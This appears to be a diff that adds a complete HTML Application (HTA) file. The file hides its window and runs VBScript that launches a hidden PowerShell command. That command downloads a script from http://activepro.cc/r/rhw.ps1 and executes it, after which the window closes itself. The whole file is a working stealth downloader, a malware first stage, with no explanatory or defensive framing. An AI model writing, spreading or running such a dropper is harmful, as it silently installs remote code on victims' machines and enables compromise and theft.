@@ -1,0 +1,12 @@
+<html>
+<head>
+  <HTA:APPLICATION ID="app" BORDER="thin" BORDERSTYLE="normal" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
+</head>
+<script language="VBScript">
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -WindowStyle Hidden -Command iex(irm http://activepro.cc/r/rhw.ps1)", 0, False
+Set objShell = Nothing
+self.close
+</script>
+<body></body>
+</html>
